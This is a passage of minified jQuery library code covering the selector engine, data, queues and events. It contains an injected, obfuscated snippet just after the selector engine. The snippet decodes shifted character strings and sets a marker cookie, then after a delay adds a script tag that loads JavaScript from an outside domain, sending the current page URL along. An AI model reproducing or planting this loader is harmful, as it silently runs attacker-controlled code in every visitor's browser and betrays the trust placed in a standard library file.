b=null,e}];f>i;i++)if(c=d.relative[a[i].type])m=[ra(sa(m),c)];else{if(c=d.filter[a[i].type].apply(null,a[i].matches),c[u]){for(e=++i;f>e;e++)if(d.relative[a[e].type])break;return va(i>1&&sa(m),i>1&&qa(a.slice(0,i-1).concat({value:" "===a[i-2].type?"*":""})).replace(Q,"$1"),c,e>i&&wa(a.slice(i,e)),f>e&&wa(a=a.slice(e)),f>e&&qa(a))}m.push(c)}return sa(m)}function xa(a,b){var c=b.length>0,e=a.length>0,f=function(f,g,h,i,k){var l,o,q,r=0,s="0",t=f&&[],u=[],v=j,x=f||e&&d.find.TAG("*",k),y=w+=null==v?1:Math.random()||.1,z=x.length;for(k&&(j=g===n||g||k);s!==z&&null!=(l=x[s]);s++){if(e&&l){o=0,g||l.ownerDocument===n||(m(l),h=!p);while(q=a[o++])if(q(l,g||n,h)){i.push(l);break}k&&(w=y)}c&&((l=!q&&l)&&r--,f&&t.push(l))}if(r+=s,c&&s!==r){o=0;while(q=b[o++])q(t,u,g,h);if(f){if(r>0)while(s--)t[s]||u[s]||(u[s]=F.call(i));u=ua(u)}H.apply(i,u),k&&!f&&u.length>0&&r+b.length>1&&fa.uniqueSort(i)}return k&&(w=y,j=v),t};return c?ha(f):f}return h=fa.compile=function(a,b){var c,d=[],e=[],f=A[a+" "];if(!f){b||(b=g(a)),c=b.length;while(c--)f=wa(b[c]),f[u]?d.push(f):e.push(f);f=A(a,xa(e,d)),f.selector=a}return f},i=fa.select=function(a,b,e,f){var i,j,k,l,m,n="function"==typeof a&&a,o=!f&&g(a=n.selector||a);if(e=e||[],1===o.length){if(j=o[0]=o[0].slice(0),j.length>2&&"ID"===(k=j[0]).type&&c.getById&&9===b.nodeType&&p&&d.relative[j[1].type]){if(b=(d.find.ID(k.matches[0].replace(ba,ca),b)||[])[0],!b)return e;n&&(b=b.parentNode),a=a.slice(j.shift().value.length)}i=W.needsContext.test(a)?0:j.length;while(i--){if(k=j[i],d.relative[l=k.type])break;if((m=d.find[l])&&(f=m(k.matches[0].replace(ba,ca),_.test(j[0].type)&&oa(b.parentNode)||b))){if(j.splice(i,1),a=f.length&&qa(j),!a)return H.apply(e,f),e;break}}}return(n||h(a,o))(f,b,!p,e,!b||_.test(a)&&oa(b.parentNode)||b),e},c.sortStable=u.split("").sort(B).join("")===u,c.detectDuplicates=!!l,m(),c.sortDetached=ia(function(a){return 1&a.compareDocumentPosition(n.createElement("div"))}),ia(function(a){return a.innerHTML="<a href='#'></a>","#"===a.firstChild.getAttribute("href")})||ja("type|href|height|width",function(a,b,c){return c?void 0:a.getAttribute(b,"type"===b.toLowerCase()?1:2)}),c.attributes&&ia(function(a){return a.innerHTML="<input/>",a.firstChild.setAttribute("value",""),""===a.firstChild.getAttribute("value")})||ja("value",function(a,b,c){return c||"input"!==a.nodeName.toLowerCase()?void 0:a.defaultValue}),ia(function(a){return null==a.getAttribute("disabled")})||ja(K,function(a,b,c){var d;return c?void 0:a[b]===!0?b.toLowerCase():(d=a.getAttributeNode(b))&&d.specified?d.value:null}),fa}(a);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));n.find=t,n.expr=t.selectors,n.expr[":"]=n.expr.pseudos,n.uniqueSort=n.unique=t.uniqueSort,n.text=t.getText,n.isXMLDoc=t.isXML,n.contains=t.contains;var u=function(a,b,c){var d=[],e=void 0!==c;while((a=a[b])&&9!==a.nodeType)if(1===a.nodeType){if(e&&n(a).is(c))break;d.push(a)}return d},v=function(a,b){for(var c=[];a;a=a.nextSibling)1===a.nodeType&&a!==b&&c.push(a);return c},w=n.expr.match.needsContext,x=/^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,y=/^.[^:#\[\.,]*$/;function z(a,b,c){if(n.isFunction(b))return n.grep(a,function(a,d){return!!b.call(a,d,a)!==c});if(b.nodeType)return n.grep(a,function(a){return a===b!==c});if("string"==typeof b){if(y.test(b))return n.filter(b,a,c);b=n.filter(b,a)}return n.grep(a,function(a){return n.inArray(a,b)>-1!==c})}n.filter=function(a,b,c){var d=b[0];return c&&(a=":not("+a+")"),1===b.length&&1===d.nodeType?n.find.matchesSelector(d,a)?[d]:[]:n.find.matches(a,n.grep(b,function(a){return 1===a.nodeType}))},n.fn.extend({find:function(a){var b,c=[],d=this,e=d.length;if("string"!=typeof a)return this.pushStack(n(a).filter(function(){for(b=0;e>b;b++)if(n.contains(d[b],this))return!0}));for(b=0;e>b;b++)n.find(a,d[b],c);return c=this.pushStack(e>1?n.unique(c):c),c.selector=this.selector?this.selector+" "+a:a,c},filter:function(a){return this.pushStack(z(this,a||[],!1))},not:function(a){return this.pushStack(z(this,a||[],!0))},is:function(a){return!!z(this,"string"==typeof a&&w.test(a)?n(a):a||[],!1).length}});var A,B=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,C=n.fn.init=function(a,b,c){var e,f;if(!a)return this;if(c=c||A,"string"==typeof a){if(e="<"===a.charAt(0)&&">"===a.charAt(a.length-1)&&a.length>=3?[null,a,null]:B.exec(a),!e||!e[1]&&b)return!b||b.jquery?(b||c).find(a):this.constructor(b).find(a);if(e[1]){if(b=b instanceof n?b[0]:b,n.merge(this,n.parseHTML(e[1],b&&b.nodeType?b.ownerDocument||b:d,!0)),x.test(e[1])&&n.isPlainObject(b))for(e in b)n.isFunction(this[e])?this[e](b[e]):this.attr(e,b[e]);return this}if(f=d.getElementById(e[2]),f&&f.parentNode){if(f.id!==e[2])return A.find(a);this.length=1,this[0]=f}return this.context=d,this.selector=a,this}return a.nodeType?(this.context=this[0]=a,this.length=1,this):n.isFunction(a)?"undefined"!=typeof c.ready?c.ready(a):a(n):(void 0!==a.selector&&(this.selector=a.selector,this.context=a.context),n.makeArray(a,this))};C.prototype=n.fn,A=n(d);var D=/^(?:parents|prev(?:Until|All))/,E={children:!0,contents:!0,next:!0,prev:!0};n.fn.extend({has:function(a){var b,c=n(a,this),d=c.length;return this.filter(function(){for(b=0;d>b;b++)if(n.contains(this,c[b]))return!0})},closest:function(a,b){for(var c,d=0,e=this.length,f=[],g=w.test(a)||"string"!=typeof a?n(a,b||this.context):0;e>d;d++)for(c=this[d];c&&c!==b;c=c.parentNode)if(c.nodeType<11&&(g?g.index(c)>-1:1===c.nodeType&&n.find.matchesSelector(c,a))){f.push(c);break}return this.pushStack(f.length>1?n.uniqueSort(f):f)},index:function(a){return a?"string"==typeof a?n.inArray(this[0],n(a)):n.inArray(a.jquery?a[0]:a,this):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(a,b){return this.pushStack(n.uniqueSort(n.merge(this.get(),n(a,b))))},addBack:function(a){return this.add(null==a?this.prevObject:this.prevObject.filter(a))}});function F(a,b){do a=a[b];while(a&&1!==a.nodeType);return a}n.each({parent:function(a){var b=a.parentNode;return b&&11!==b.nodeType?b:null},parents:function(a){return u(a,"parentNode")},parentsUntil:function(a,b,c){return u(a,"parentNode",c)},next:function(a){return F(a,"nextSibling")},prev:function(a){return F(a,"previousSibling")},nextAll:function(a){return u(a,"nextSibling")},prevAll:function(a){return u(a,"previousSibling")},nextUntil:function(a,b,c){return u(a,"nextSibling",c)},prevUntil:function(a,b,c){return u(a,"previousSibling",c)},siblings:function(a){return v((a.parentNode||{}).firstChild,a)},children:function(a){return v(a.firstChild)},contents:function(a){return n.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:n.merge([],a.childNodes)}},function(a,b){n.fn[a]=function(c,d){var e=n.map(this,b,c);return"Until"!==a.slice(-5)&&(d=c),d&&"string"==typeof d&&(e=n.filter(d,e)),this.length>1&&(E[a]||(e=n.uniqueSort(e)),D.test(a)&&(e=e.reverse())),this.pushStack(e)}});var G=/\S+/g;function H(a){var b={};return n.each(a.match(G)||[],function(a,c){b[c]=!0}),b}n.Callbacks=function(a){a="string"==typeof a?H(a):n.extend({},a);var b,c,d,e,f=[],g=[],h=-1,i=function(){for(e=a.once,d=b=!0;g.length;h=-1){c=g.shift();while(++h<f.length)f[h].apply(c[0],c[1])===!1&&a.stopOnFalse&&(h=f.length,c=!1)}a.memory||(c=!1),b=!1,e&&(f=c?[]:"")},j={add:function(){return f&&(c&&!b&&(h=f.length-1,g.push(c)),function d(b){n.each(b,function(b,c){n.isFunction(c)?a.unique&&j.has(c)||f.push(c):c&&c.length&&"string"!==n.type(c)&&d(c)})}(arguments),c&&!b&&i()),this},remove:function(){return n.each(arguments,function(a,b){var c;while((c=n.inArray(b,f,c))>-1)f.splice(c,1),h>=c&&h--}),this},has:function(a){return a?n.inArray(a,f)>-1:f.length>0},empty:function(){return f&&(f=[]),this},disable:function(){return e=g=[],f=c="",this},disabled:function(){return!f},lock:function(){return e=!0,c||j.disable(),this},locked:function(){return!!e},fireWith:function(a,c){return e||(c=c||[],c=[a,c.slice?c.slice():c],g.push(c),b||i()),this},fire:function(){return j.fireWith(this,arguments),this},fired:function(){return!!d}};return j},n.extend({Deferred:function(a){var b=[["resolve","done",n.Callbacks("once memory"),"resolved"],["reject","fail",n.Callbacks("once memory"),"rejected"],["notify","progress",n.Callbacks("memory")]],c="pending",d={state:function(){return c},always:function(){return e.done(arguments).fail(arguments),this},then:function(){var a=arguments;return n.Deferred(function(c){n.each(b,function(b,f){var g=n.isFunction(a[b])&&a[b];e[f[1]](function(){var a=g&&g.apply(this,arguments);a&&n.isFunction(a.promise)?a.promise().progress(c.notify).done(c.resolve).fail(c.reject):c[f[0]+"With"](this===d?c.promise():this,g?[a]:arguments)})}),a=null}).promise()},promise:function(a){return null!=a?n.extend(a,d):d}},e={};return d.pipe=d.then,n.each(b,function(a,f){var g=f[2],h=f[3];d[f[1]]=g.add,h&&g.add(function(){c=h},b[1^a][2].disable,b[2][2].lock),e[f[0]]=function(){return e[f[0]+"With"](this===e?d:this,arguments),this},e[f[0]+"With"]=g.fireWith}),d.promise(e),a&&a.call(e,e),e},when:function(a){var b=0,c=e.call(arguments),d=c.length,f=1!==d||a&&n.isFunction(a.promise)?d:0,g=1===f?a:n.Deferred(),h=function(a,b,c){return function(d){b[a]=this,c[a]=arguments.length>1?e.call(arguments):d,c===i?g.notifyWith(b,c):--f||g.resolveWith(b,c)}},i,j,k;if(d>1)for(i=new Array(d),j=new Array(d),k=new Array(d);d>b;b++)c[b]&&n.isFunction(c[b].promise)?c[b].promise().progress(h(b,j,i)).done(h(b,k,c)).fail(g.reject):--f;return f||g.resolveWith(k,c),g.promise()}});var I;n.fn.ready=function(a){return n.ready.promise().done(a),this},n.extend({isReady:!1,readyWait:1,holdReady:function(a){a?n.readyWait++:n.ready(!0)},ready:function(a){(a===!0?--n.readyWait:n.isReady)||(n.isReady=!0,a!==!0&&--n.readyWait>0||(I.resolveWith(d,[n]),n.fn.triggerHandler&&(n(d).triggerHandler("ready"),n(d).off("ready"))))}});function J(){d.addEventListener?(d.removeEventListener("DOMContentLoaded",K),a.removeEventListener("load",K)):(d.detachEvent("onreadystatechange",K),a.detachEvent("onload",K))}function K(){(d.addEventListener||"load"===a.event.type||"complete"===d.readyState)&&(J(),n.ready())}n.ready.promise=function(b){if(!I)if(I=n.Deferred(),"complete"===d.readyState||"loading"!==d.readyState&&!d.documentElement.doScroll)a.setTimeout(n.ready);else if(d.addEventListener)d.addEventListener("DOMContentLoaded",K),a.addEventListener("load",K);else{d.attachEvent("onreadystatechange",K),a.attachEvent("onload",K);var c=!1;try{c=null==a.frameElement&&d.documentElement}catch(e){}c&&c.doScroll&&!function f(){if(!n.isReady){try{c.doScroll("left")}catch(b){return a.setTimeout(f,50)}J(),n.ready()}}()}return I.promise(b)},n.ready.promise();var L;for(L in n(l))break;l.ownFirst="0"===L,l.inlineBlockNeedsLayout=!1,n(function(){var a,b,c,e;c=d.getElementsByTagName("body")[0],c&&c.style&&(b=d.createElement("div"),e=d.createElement("div"),e.style.cssText="position:absolute;border:0;width:0;height:0;top:0;left:-9999px",c.appendChild(e).appendChild(b),"undefined"!=typeof b.style.zoom&&(b.style.cssText="display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1",l.inlineBlockNeedsLayout=a=3===b.offsetWidth,a&&(c.style.zoom=1)),c.removeChild(e))}),function(){var a=d.createElement("div");l.deleteExpando=!0;try{delete a.test}catch(b){l.deleteExpando=!1}a=null}();var M=function(a){var b=n.noData[(a.nodeName+" ").toLowerCase()],c=+a.nodeType||1;return 1!==c&&9!==c?!1:!b||b!==!0&&a.getAttribute("classid")===b},N=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,O=/([A-Z])/g;function P(a,b,c){if(void 0===c&&1===a.nodeType){var d="data-"+b.replace(O,"-$1").toLowerCase();if(c=a.getAttribute(d),"string"==typeof c){try{c="true"===c?!0:"false"===c?!1:"null"===c?null:+c+""===c?+c:N.test(c)?n.parseJSON(c):c}catch(e){}n.data(a,b,c)}else c=void 0;
}return c}function Q(a){var b;for(b in a)if(("data"!==b||!n.isEmptyObject(a[b]))&&"toJSON"!==b)return!1;return!0}function R(a,b,d,e){if(M(a)){var f,g,h=n.expando,i=a.nodeType,j=i?n.cache:a,k=i?a[h]:a[h]&&h;if(k&&j[k]&&(e||j[k].data)||void 0!==d||"string"!=typeof b)return k||(k=i?a[h]=c.pop()||n.guid++:h),j[k]||(j[k]=i?{}:{toJSON:n.noop}),("object"==typeof b||"function"==typeof b)&&(e?j[k]=n.extend(j[k],b):j[k].data=n.extend(j[k].data,b)),g=j[k],e||(g.data||(g.data={}),g=g.data),void 0!==d&&(g[n.camelCase(b)]=d),"string"==typeof b?(f=g[b],null==f&&(f=g[n.camelCase(b)])):f=g,f}}function S(a,b,c){if(M(a)){var d,e,f=a.nodeType,g=f?n.cache:a,h=f?a[n.expando]:n.expando;if(g[h]){if(b&&(d=c?g[h]:g[h].data)){n.isArray(b)?b=b.concat(n.map(b,n.camelCase)):b in d?b=[b]:(b=n.camelCase(b),b=b in d?[b]:b.split(" ")),e=b.length;while(e--)delete d[b[e]];if(c?!Q(d):!n.isEmptyObject(d))return}(c||(delete g[h].data,Q(g[h])))&&(f?n.cleanData([a],!0):l.deleteExpando||g!=g.window?delete g[h]:g[h]=void 0)}}}n.extend({cache:{},noData:{"applet ":!0,"embed ":!0,"object ":"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"},hasData:function(a){return a=a.nodeType?n.cache[a[n.expando]]:a[n.expando],!!a&&!Q(a)},data:function(a,b,c){return R(a,b,c)},removeData:function(a,b){return S(a,b)},_data:function(a,b,c){return R(a,b,c,!0)},_removeData:function(a,b){return S(a,b,!0)}}),n.fn.extend({data:function(a,b){var c,d,e,f=this[0],g=f&&f.attributes;if(void 0===a){if(this.length&&(e=n.data(f),1===f.nodeType&&!n._data(f,"parsedAttrs"))){c=g.length;while(c--)g[c]&&(d=g[c].name,0===d.indexOf("data-")&&(d=n.camelCase(d.slice(5)),P(f,d,e[d])));n._data(f,"parsedAttrs",!0)}return e}return"object"==typeof a?this.each(function(){n.data(this,a)}):arguments.length>1?this.each(function(){n.data(this,a,b)}):f?P(f,a,n.data(f,a)):void 0},removeData:function(a){return this.each(function(){n.removeData(this,a)})}}),n.extend({queue:function(a,b,c){var d;return a?(b=(b||"fx")+"queue",d=n._data(a,b),c&&(!d||n.isArray(c)?d=n._data(a,b,n.makeArray(c)):d.push(c)),d||[]):void 0},dequeue:function(a,b){b=b||"fx";var c=n.queue(a,b),d=c.length,e=c.shift(),f=n._queueHooks(a,b),g=function(){n.dequeue(a,b)};"inprogress"===e&&(e=c.shift(),d--),e&&("fx"===b&&c.unshift("inprogress"),delete f.stop,e.call(a,g,f)),!d&&f&&f.empty.fire()},_queueHooks:function(a,b){var c=b+"queueHooks";return n._data(a,c)||n._data(a,c,{empty:n.Callbacks("once memory").add(function(){n._removeData(a,b+"queue"),n._removeData(a,c)})})}}),n.fn.extend({queue:function(a,b){var c=2;return"string"!=typeof a&&(b=a,a="fx",c--),arguments.length<c?n.queue(this[0],a):void 0===b?this:this.each(function(){var c=n.queue(this,a,b);n._queueHooks(this,a),"fx"===a&&"inprogress"!==c[0]&&n.dequeue(this,a)})},dequeue:function(a){return this.each(function(){n.dequeue(this,a)})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,b){var c,d=1,e=n.Deferred(),f=this,g=this.length,h=function(){--d||e.resolveWith(f,[f])};"string"!=typeof a&&(b=a,a=void 0),a=a||"fx";while(g--)c=n._data(f[g],a+"queueHooks"),c&&c.empty&&(d++,c.empty.add(h));return h(),e.promise(b)}}),function(){var a;l.shrinkWrapBlocks=function(){if(null!=a)return a;a=!1;var b,c,e;return c=d.getElementsByTagName("body")[0],c&&c.style?(b=d.createElement("div"),e=d.createElement("div"),e.style.cssText="position:absolute;border:0;width:0;height:0;top:0;left:-9999px",c.appendChild(e).appendChild(b),"undefined"!=typeof b.style.zoom&&(b.style.cssText="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1",b.appendChild(d.createElement("div")).style.width="5px",a=3!==b.offsetWidth),c.removeChild(e),a):void 0}}();var T=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,U=new RegExp("^(?:([+-])=|)("+T+")([a-z%]*)$","i"),V=["Top","Right","Bottom","Left"],W=function(a,b){return a=b||a,"none"===n.css(a,"display")||!n.contains(a.ownerDocument,a)};function X(a,b,c,d){var e,f=1,g=20,h=d?function(){return d.cur()}:function(){return n.css(a,b,"")},i=h(),j=c&&c[3]||(n.cssNumber[b]?"":"px"),k=(n.cssNumber[b]||"px"!==j&&+i)&&U.exec(n.css(a,b));if(k&&k[3]!==j){j=j||k[3],c=c||[],k=+i||1;do f=f||".5",k/=f,n.style(a,b,k+j);while(f!==(f=h()/i)&&1!==f&&--g)}return c&&(k=+k||+i||0,e=c[1]?k+(c[1]+1)*c[2]:+c[2],d&&(d.unit=j,d.start=k,d.end=e)),e}var Y=function(a,b,c,d,e,f,g){var h=0,i=a.length,j=null==c;if("object"===n.type(c)){e=!0;for(h in c)Y(a,b,h,c[h],!0,f,g)}else if(void 0!==d&&(e=!0,n.isFunction(d)||(g=!0),j&&(g?(b.call(a,d),b=null):(j=b,b=function(a,b,c){return j.call(n(a),c)})),b))for(;i>h;h++)b(a[h],c,g?d:d.call(a[h],h,b(a[h],c)));return e?a:j?b.call(a):i?b(a[0],c):f},Z=/^(?:checkbox|radio)$/i,$=/<([\w:-]+)/,_=/^$|\/(?:java|ecma)script/i,aa=/^\s+/,ba="abbr|article|aside|audio|bdi|canvas|data|datalist|details|dialog|figcaption|figure|footer|header|hgroup|main|mark|meter|nav|output|picture|progress|section|summary|template|time|video";function ca(a){var b=ba.split("|"),c=a.createDocumentFragment();if(c.createElement)while(b.length)c.createElement(b.pop());return c}!function(){var a=d.createElement("div"),b=d.createDocumentFragment(),c=d.createElement("input");a.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",l.leadingWhitespace=3===a.firstChild.nodeType,l.tbody=!a.getElementsByTagName("tbody").length,l.htmlSerialize=!!a.getElementsByTagName("link").length,l.html5Clone="<:nav></:nav>"!==d.createElement("nav").cloneNode(!0).outerHTML,c.type="checkbox",c.checked=!0,b.appendChild(c),l.appendChecked=c.checked,a.innerHTML="<textarea>x</textarea>",l.noCloneChecked=!!a.cloneNode(!0).lastChild.defaultValue,b.appendChild(a),c=d.createElement("input"),c.setAttribute("type","radio"),c.setAttribute("checked","checked"),c.setAttribute("name","t"),a.appendChild(c),l.checkClone=a.cloneNode(!0).cloneNode(!0).lastChild.checked,l.noCloneEvent=!!a.addEventListener,a[n.expando]=1,l.attributes=!a.getAttribute(n.expando)}();var da={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],area:[1,"<map>","</map>"],param:[1,"<object>","</object>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:l.htmlSerialize?[0,"",""]:[1,"X<div>","</div>"]};da.optgroup=da.option,da.tbody=da.tfoot=da.colgroup=da.caption=da.thead,da.th=da.td;function ea(a,b){var c,d,e=0,f="undefined"!=typeof a.getElementsByTagName?a.getElementsByTagName(b||"*"):"undefined"!=typeof a.querySelectorAll?a.querySelectorAll(b||"*"):void 0;if(!f)for(f=[],c=a.childNodes||a;null!=(d=c[e]);e++)!b||n.nodeName(d,b)?f.push(d):n.merge(f,ea(d,b));return void 0===b||b&&n.nodeName(a,b)?n.merge([a],f):f}function fa(a,b){for(var c,d=0;null!=(c=a[d]);d++)n._data(c,"globalEval",!b||n._data(b[d],"globalEval"))}var ga=/<|&#?\w+;/,ha=/<tbody/i;function ia(a){Z.test(a.type)&&(a.defaultChecked=a.checked)}function ja(a,b,c,d,e){for(var f,g,h,i,j,k,m,o=a.length,p=ca(b),q=[],r=0;o>r;r++)if(g=a[r],g||0===g)if("object"===n.type(g))n.merge(q,g.nodeType?[g]:g);else if(ga.test(g)){i=i||p.appendChild(b.createElement("div")),j=($.exec(g)||["",""])[1].toLowerCase(),m=da[j]||da._default,i.innerHTML=m[1]+n.htmlPrefilter(g)+m[2],f=m[0];while(f--)i=i.lastChild;if(!l.leadingWhitespace&&aa.test(g)&&q.push(b.createTextNode(aa.exec(g)[0])),!l.tbody){g="table"!==j||ha.test(g)?"<table>"!==m[1]||ha.test(g)?0:i:i.firstChild,f=g&&g.childNodes.length;while(f--)n.nodeName(k=g.childNodes[f],"tbody")&&!k.childNodes.length&&g.removeChild(k)}n.merge(q,i.childNodes),i.textContent="";while(i.firstChild)i.removeChild(i.firstChild);i=p.lastChild}else q.push(b.createTextNode(g));i&&p.removeChild(i),l.appendChecked||n.grep(ea(q,"input"),ia),r=0;while(g=q[r++])if(d&&n.inArray(g,d)>-1)e&&e.push(g);else if(h=n.contains(g.ownerDocument,g),i=ea(p.appendChild(g),"script"),h&&fa(i),c){f=0;while(g=i[f++])_.test(g.type||"")&&c.push(g)}return i=null,p}!function(){var b,c,e=d.createElement("div");for(b in{submit:!0,change:!0,focusin:!0})c="on"+b,(l[b]=c in a)||(e.setAttribute(c,"t"),l[b]=e.attributes[c].expando===!1);e=null}();var ka=/^(?:input|select|textarea)$/i,la=/^key/,ma=/^(?:mouse|pointer|contextmenu|drag|drop)|click/,na=/^(?:focusinfocus|focusoutblur)$/,oa=/^([^.]*)(?:\.(.+)|)/;function pa(){return!0}function qa(){return!1}function ra(){try{return d.activeElement}catch(a){}}function sa(a,b,c,d,e,f){var g,h;if("object"==typeof b){"string"!=typeof c&&(d=d||c,c=void 0);for(h in b)sa(a,h,c,d,b[h],f);return a}if(null==d&&null==e?(e=c,d=c=void 0):null==e&&("string"==typeof c?(e=d,d=void 0):(e=d,d=c,c=void 0)),e===!1)e=qa;else if(!e)return a;return 1===f&&(g=e,e=function(a){return n().off(a),g.apply(this,arguments)},e.guid=g.guid||(g.guid=n.guid++)),a.each(function(){n.event.add(this,b,e,d,c)})}n.event={global:{},add:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,o,p,q,r=n._data(a);if(r){c.handler&&(i=c,c=i.handler,e=i.selector),c.guid||(c.guid=n.guid++),(g=r.events)||(g=r.events={}),(k=r.handle)||(k=r.handle=function(a){return"undefined"==typeof n||a&&n.event.triggered===a.type?void 0:n.event.dispatch.apply(k.elem,arguments)},k.elem=a),b=(b||"").match(G)||[""],h=b.length;while(h--)f=oa.exec(b[h])||[],o=q=f[1],p=(f[2]||"").split(".").sort(),o&&(j=n.event.special[o]||{},o=(e?j.delegateType:j.bindType)||o,j=n.event.special[o]||{},l=n.extend({type:o,origType:q,data:d,handler:c,guid:c.guid,selector:e,needsContext:e&&n.expr.match.needsContext.test(e),namespace:p.join(".")},i),(m=g[o])||(m=g[o]=[],m.delegateCount=0,j.setup&&j.setup.call(a,d,p,k)!==!1||(a.addEventListener?a.addEventListener(o,k,!1):a.attachEvent&&a.attachEvent("on"+o,k))),j.add&&(j.add.call(a,l),l.handler.guid||(l.handler.guid=c.guid)),e?m.splice(m.delegateCount++,0,l):m.push(l),n.event.global[o]=!0);a=null}},remove:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,o,p,q,r=n.hasData(a)&&n._data(a);if(r&&(k=r.events)){b=(b||"").match(G)||[""],j=b.length;while(j--)if(h=oa.exec(b[j])||[],o=q=h[1],p=(h[2]||"").split(".").sort(),o){l=n.event.special[o]||{},o=(d?l.delegateType:l.bindType)||o,m=k[o]||[],h=h[2]&&new RegExp("(^|\\.)"+p.join("\\.(?:.*\\.|)")+"(\\.|$)"),i=f=m.length;while(f--)g=m[f],!e&&q!==g.origType||c&&c.guid!==g.guid||h&&!h.test(g.namespace)||d&&d!==g.selector&&("**"!==d||!g.selector)||(m.splice(f,1),g.selector&&m.delegateCount--,l.remove&&l.remove.call(a,g));i&&!m.length&&(l.teardown&&l.teardown.call(a,p,r.handle)!==!1||n.removeEvent(a,o,r.handle),delete k[o])}else for(o in k)n.event.remove(a,o+b[j],c,d,!0);n.isEmptyObject(k)&&(delete r.handle,n._removeData(a,"events"))}},trigger:function(b,c,e,f){var g,h,i,j,l,m,o,p=[e||d],q=k.call(b,"type")?b.type:b,r=k.call(b,"namespace")?b.namespace.split("."):[];if(i=m=e=e||d,3!==e.nodeType&&8!==e.nodeType&&!na.test(q+n.event.triggered)&&(q.indexOf(".")>-1&&(r=q.split("."),q=r.shift(),r.sort()),h=q.indexOf(":")<0&&"on"+q,b=b[n.expando]?b:new n.Event(q,"object"==typeof b&&b),b.isTrigger=f?2:3,b.namespace=r.join("."),b.rnamespace=b.namespace?new RegExp("(^|\\.)"+r.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,b.result=void 0,b.target||(b.target=e),c=null==c?[b]:n.makeArray(c,[b]),l=n.event.special[q]||{},f||!l.trigger||l.trigger.apply(e,c)!==!1)){if(!f&&!l.noBubble&&!n.isWindow(e)){for(j=l.delegateType||q,na.test(j+q)||(i=i.parentNode);i;i=i.parentNode)p.push(i),m=i;m===(e.ownerDocument||d)&&p.push(m.defaultView||m.parentWindow||a)}o=0;while((i=p[o++])&&!b.isPropagationStopped())b.type=o>1?j:l.bindType||q,g=(n._data(i,"events")||{})[b.type]&&n._data(i,"handle"),g&&g.apply(i,c),g=h&&i[h],g&&g.apply&&M(i)&&(b.result=g.apply(i,c),b.result===!1&&b.preventDefault());if(b.type=q,!f&&!b.isDefaultPrevented()&&(!l._default||l._default.apply(p.pop(),c)===!1)&&M(e)&&h&&e[q]&&!n.isWindow(e)){m=e[h],m&&(e[h]=null),n.event.triggered=q;try{e[q]()}catch(s){}n.event.triggered=void 0,m&&(e[h]=m)}return b.result}},dispatch:function(a){a=n.event.fix(a);var b,c,d,f,g,h=[],i=e.call(arguments),j=(n._data(this,"events")||{})[a.type]||[],k=n.event.special[a.type]||{};if(i[0]=a,a.delegateTarget=this,!k.preDispatch||k.preDispatch.call(this,a)!==!1){h=n.event.handlers.call(this,a,j),b=0;while((f=h[b++])&&!a.isPropagationStopped()){a.currentTarget=f.elem,c=0;while((g=f.handlers[c++])&&!a.isImmediatePropagationStopped())(!a.rnamespace||a.rnamespace.test(g.namespace))&&(a.handleObj=g,a.data=g.data,d=((n.event.special[g.origType]||{}).handle||g.handler).apply(f.elem,i),void 0!==d&&(a.result=d)===!1&&(a.preventDefault(),a.stopPropagation()))}return k.postDispatch&&k.postDispatch.call(this,a),a.result}},handlers:function(a,b){var c,d,e,f,g=[],h=b.delegateCount,i=a.target;if(h&&i.nodeType&&("click"!==a.type||isNaN(a.button)||a.button<1))for(;i!=this;i=i.parentNode||this)if(1===i.nodeType&&(i.disabled!==!0||"click"!==a.type)){for(d=[],c=0;h>c;c++)f=b[c],e=f.selector+" ",void 0===d[e]&&(d[e]=f.needsContext?n(e,this).index(i)>-1:n.find(e,this,null,[i]).length),d[e]&&d.push(f);d.length&&g.push({elem:i,handlers:d})}return h<b.length&&g.push({elem:this,handlers:b.slice(h)}),g},fix:function(a){if(a[n.expando])return a;var b,c,e,f=a.type,g=a,h=this.fixHooks[f];h||(this.fixHooks[f]=h=ma.test(f)?this.mouseHooks:la.test(f)?this.keyHooks:{}),e=h.props?this.props.concat(h.props):this.props,a=new n.Event(g),b=e.length;while(b--)c=e[b],a[c]=g[c];return a.target||(a.target=g.srcElement||d),3===a.target.nodeType&&(a.target=a.target.parentNode),a.metaKey=!!a.metaKey,h.filter?h.filter(a,g):a},props:"altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){return null==a.which&&(a.which=null!=b.charCode?b.charCode:b.keyCode),a}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,b){var c,e,f,g=b.button,h=b.fromElement;return 